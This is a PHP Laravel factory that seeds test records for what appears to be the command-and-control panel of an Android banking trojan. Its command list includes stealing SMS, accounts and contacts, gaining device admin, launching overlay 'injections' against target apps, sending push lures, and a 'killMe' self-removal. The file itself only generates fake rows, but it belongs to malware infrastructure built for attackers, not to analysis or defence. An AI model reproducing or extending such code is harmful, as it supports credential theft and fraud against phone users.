<?php

namespace Database\Factories;

use App\Models\BotCommand;
use App\Models\Injection;
use Exception;
use Illuminate\Database\Eloquent\Factories\Factory;
use Illuminate\Support\Carbon;
use JetBrains\PhpStorm\ArrayShape;

class BotCommandFactory extends Factory
{
    /**
     * The name of the factory's corresponding model.
     *
     * @var string
     */
    protected $model = BotCommand::class;

    /**
     * @throws Exception
     */
    #[ArrayShape(['is_processed' => "bool", 'command' => "array", 'run_at' => "null|string"])] public function definition(): array
    {
        $inject = Injection::inRandomOrder()->first();

        $commands = [
            'startAdmin' => [],
            'getSMS' => [],
            'getInstallApps' => [],
            'updateInjectAndListApps' => [],
            'push' => [
                'app' => $inject->application,
                'title' => $inject->name,
                'text' => $this->faker->text,
            ],
            'getAccounts' => [],
            'getContacts' => [],
            'trust' => [],
            'clearCache' => [],
            'startInject' => [
                'app' => $inject->application,
            ],
            'killMe' => [],
            'startApp' => [
                'app' => $inject->application,
            ],
        ];

        $command_key = array_rand($commands);
        $command_payload = $commands[$command_key];

        return [
            'is_processed' => $this->faker->boolean,
            'command' => [
                'command' => $command_key,
                'payload' => $command_payload,
            ],
            'run_at' => random_int(0, 100) <= 25 ? Carbon::parse($this->faker->dateTimeBetween('-60days'))->toDateTimeString() : NULL,
        ];
    }
}
